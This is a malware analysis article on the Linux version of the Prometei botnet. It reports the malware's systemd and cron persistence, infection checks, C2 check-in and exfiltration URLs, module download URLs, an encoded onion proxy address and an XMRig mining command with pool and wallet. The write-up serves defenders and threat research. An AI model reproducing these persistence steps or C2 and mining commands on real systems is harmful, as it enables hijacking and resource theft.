For this first article in the series, I will analyze the Linux version of the Prometei\nmalware, which first made headlines in December 2020.\n\n\n-----\n\nWe often find IoT malware that is simply built on the leaked source code of Mirai or Gafgyt.\nIt’s not so typical to find new variants that are unique: either wholly written from scratch or\nported from other platforms, such as Windows.\n\nOriginally, Prometei had been a modular Windows botnet that mined the Monero\ncryptocurrency. In early December, it was discovered targeting Linux environments for the\nfirst time. It’s possible that the original developer(s) were unhappy with the spread of their\nmalware and wanted to take advantage of other platforms. Another theory is that this new\nLinux variant is the work of a completely different group.\n\nPrometei’s C2 IP and URLs are blocked by the Safe Browsing/IP Reputation feature of\n[CUJO AI Sentry. Learn more by reading the Sentry white paper.](https://cujo.com/resources/cujo-ai-sentry-whitepaper/)\n\nIntezerLabs announcing the discovery of Prometei on Linux\n\n## File analysis of the Linux Prometei version\n\nPrometei binaries are all stripped of symbols and debug information, making reverseengineering a bit harder. No packing was applied to the binaries.\n\nMagic information:\n```\nELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter\n/lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.8, stripped\n\n```\n\n-----\n\nTrID:\n```\nELF Executable and Linkable format (Linux) (4029/14) 49.77%\nELF Executable and Linkable format (generic) (4004/1) 49.46%\n\n```\nEntropy measures the randomness of a given data set and is used to detect signs of\npacking, encryption or any sort of compression. ~5.7 is a good indicator that what we have\nhere is a native executable without any packing, but we can also check the plain-text strings\nto be sure.\n\nEntropy:\n```\n5.789075219871666\n\n## Prometei execution flow\n\n```\nFirst, Prometei tries to find out if it can install itself on the system and checks whether a copy\nof Prometei has been installed on the system previously by looking for Prometei-specific\n**artifacts.**\n\nstrace output of the malicious binary\n\nIf the logged in user does not have sufficient rights (root), Prometei installs itself in\n“Usermode” and leaves a crashed.dump file in /home/user, which is the malicious binary\nitself. It also places a custom, machine-specific identification ID under the filename CommId\ninto the /home/user folder.\n\nPrometei Usermode install\n\nIf the user has root privileges, the malicious code will install itself system-wide\n(“Systemmode”):\n\n\n-----\n\nPrometei Systemmode install\n\nThen the malware creates a random bot identifier file in /etc/CommId, which has a 16 byte\nstring inside, made up of numbers and capital English letters: /etc/CommId.\n\nExample IDs:\n```\nMU2G1NCM0HDF3L2N\n6214X121I3A61W1S\n2S53GTBN3H8XTE5J\n91S3UJ2R3244U300\n\n```\nIt uses this identifier during the C2 check-in phase. The Prometei bot identifier is passed\nalong in a GET request via the &i= parameter inside the URL. The purpose of this identifier is\nto keep track of every unique installation on the botnet:\n```\nhttp://p1.feefreepool[.]net/cgi-bin/prometei.cgi?r=18&i=MU2G1NCM0HDF3L2N\n\n```\nThe program continues by setting up persistence. It places a service file under\n_/lib/systemd/system/uplugplay.service with the following content:_\n\nService for persistence\n\nThen, a symlink will be created from /etc/systemd/system/multi_user.target.wants/uplugplay.service to /lib/systemd/system/uplugplay.service. This ensures_\nthe binary will be executed upon a restart.\n\nExecution will continue by setting up a scheduled cron job. It is placed into /tmp/task.cron\nwith a reboot command: @reboot means run the following command once after the system\nreboots.\n```\n@reboot /usr/sbin/uplugplay -cron.\n\n```\nThen task.cron gets installed via crontab:\n\n\n-----\n\n```\n# DO NOT EDIT THIS FILE edit the master and reinstall...# (task.cron installed on\nWed Jan 13 15:37:40 2021).# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17\n03:20:37 vixie Exp $)[email protected] /usr/sbin/uplugplay -cron.\n\n```\nAs a final step, the malware masquerades itself by copying the binary into the following\nfolder: /usr/sbin/uplugplay and deleting itself from the original execution location.\n\n## Dynamic process tracing:\n\nWhen tracing the execution of Prometei, it executes the following commands:\n\n**Persistence** **Infection markers** **Gathering information**\n\n_Systemctl daemon-reload_ _Pgrep promet15_ _Cat /proc/cpuinfo_\n\n_Systemctl enable uplugplay.service_ _Pgrep uplugplay_ _Dmidecode –type baseboard_\n\n_Systemctl start uplugplay.service_ _Pidof uplugplay_ _Cat /etc/os-release_\n\n_Crontab -l_ _Pgrep upnpsetup_ _Cat /etc/redhat-release_\n\n_Crontab task.cron_ _Pidof upnpsetup_ _uptime_\n\nThe commands in the first column are used to set up persistence. Then Prometei checks\nwhether it has already been installed on the system via the pidof and pgrep commands.\nMoreover, the commands in the third column are responsible for gathering information from\nthe victim host.\n\n## Prometei botnet network traffic analysis\n\nLet us quickly investigate the C2 communication. Every Prometei bot installation gets\ntracked by a simple check-in activity, which holds a custom, random identifier. Note the old\n_HTTP/1.0 protocol version used._\n\nTraffic can be easily intercepted via a local python webserver:\n\nIntercepting Prometei botnet traffic via python webserver\n\n\n-----\n\nC2 check-in activity\n\nURI parameters:\n\n**?r – randomized with each request, integer between 0 and 30, seems to serve no**\npurpose currently\n**&i – unique victim identifier, 16-byte string**\n\nOnce the check-in completes, the controller immediately sends the sysinfo command for\nexecution, and the collected system information gets sent right back to the botnet controller:\n\n\n-----\n\nExfiltrating sysinfo output\n\nURI parameters:\n\n**?add – base64 encoded information that is collected from the system**\n**&i – unique victim identifier**\n**&h – hostname**\n**&enckey – base64 encoded encryption key**\n\nThe base64 encoded section (?add parameter) translates to:\n```\ninfo {\nv2.92X_Unix64\nubuntu-analyzer\n1x Intel(R) Xeon(R) Silver 4210 CPU @ 2.20GHz\nIntel Corporation\n440BX Desktop Reference Platform\nUbuntu & 16.04.4 LTS (Xenial Xerus) \n/usr/sbin/\n14:31:30 up 6 min, 1 user, load average: 0.89, 0.47, 0.22\nLinux ubuntu-analyzer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018\nx86_64 x86_64 x86_64 GNU/Linux\n}\n\n```\n\n-----\n\n[Sandbox dynamic run output from Joe Security LLC. Report at](https://www.joesecurity.org/)\n_https://www.joesandbox.com/analysis/339103/0/html_\n\n## Commands\n\nNext, the malware enters a dormant state: listening for instructions from its C2 server. The\nfollowing list of commands was available in the examined binary:\n\n**Commands** **Description**\n\n**chkport** the msdtc module initiates a port scan on the victim host\n\n**debug** debug the victim host for any issues\n\n**exec** executes a binary on the system from a path\n\n**extip** fetches the external IP address of the victim\n\n**quit** exits the listener process\n\n**quit2** exits the listener function but leaves the process on\n\n**set_cc** sets a new C2 IP address\n\n**start_mining** starts the Monero cryptocurrency miner\n\n**stop_mining** stops the Monero cryptocurrency miner\n\n**sysinfo** gathers information from the victim machine for exfiltration\n\n**touch** creates a file on the victim system\n\n**updatev4** fetches the latest version of the malware\n\n**wget** downloads a file from a URL\n\n**xwget** downloads a file from a URL with a 1-byte XOR operation\n\n## Prometei traffic routing through proxies and TOR\n\nPrometei has an additional module in which traffic can be routed through TOR or I2P, rather\nthan the conventional HTTP route. These modules go under the name:\n\n**msdtc – Proxy client**\n**smcard – TOR relay**\n\n\n-----\n\nStatus messages of the msdtc proxy client\n\n\n-----\n\nmsdtc showing status information of the TOR service\n\nWhen Prometei first pulls down these modules, it downloads them via the dwn.php\nresource:\n```\nhttp://178.21.164[.]68/lQ.php?a=t-msdtc\nhttp://178.21.164[.]68/lQ.php?a=t-smcard\n\n```\nThe malware runs the following commands to check whether the TOR or proxy modules are\nalready running:\n```\npgrep smcard\npidof smcard\n/etc/smcard\n/usr/sbin/smcard\n\n```\n\n-----\n\nThe proxy request gets executed in an interesting way: the .onion address is base64\n**encoded and is called as a parameter to the msdtc module:**\n```\n/usr/sbin/msdtc\naHR0cHM6Ly9nYjduaTVyZ2VleGRjbmNqLm9uaW9uL2NnaS1iaW4vcHJvbWV0ZWkuY2dpP3I9MyZpPU1VMkcxTk\n\n```\nWhich translates to:\n```\n/usr/sbin/msdtc https://gb7ni5rgeexdcncj[.]onion/cgi-bin/prometei.cgi?r=3&i=\nMU2G1NCM0HDF3L2N\n\n## How Prometei mines cryptocurrency\n\n```\nPrometei can also deploy a cryptocurrency miner in the form of the application XMRig. The\nprocess is usually named updatecheckerd.\n\nStarting and stopping the mining operation\n\nWhen the start_mining command is received from the C2 server, it will connect to the\nfollowing miner server:\n```\n/usr/sbin/updatecheckerd -o stratum+tcp://5.189.171[.]187:3333 -u\n4A1txQ9L8h8NqF4EtGsZDP5vRN3yTVKynbkyP1jvCiDajNLPepPbBdrbaqBu8fCTcFEFdCtgbekSsTf17B1Mhy\n -p x --donate-level 1\n\n## Conclusion\n\n```\nPrometei is another example of how a malicious binary grows on a Linux environment and\nspreads through the system with persistence. Some feature of the Windows version of\nPrometei were not implemented in Linux, meaning that this is most likely an early\ndevelopment version of the malware, and we may see advancements in its capabilities as\ntime goes on.\n\nThis is most likely an early development version of the malware, and we may see\nadvancements in its capabilities as time goes on.\n\n\n-----\n\nIt is also unclear whether the same group that developed the malware for Windows is behind\nthe Linux version, and whether the developers are also the ones that distribute this piece of\n[malware. Lately, developer groups have adopted the MaaS (Malware-as-a-service) business](https://www.lastline.com/blog/malware-as-a-service-the-9-to-5-of-organized-cybercrime/)\nmodel, where they offer malware to be used by others.\n\nWe may learn more about these aspects of Prometei with future versions of the malware.\n\n[Special thanks to Talos Intelligence for their previous research on the Windows
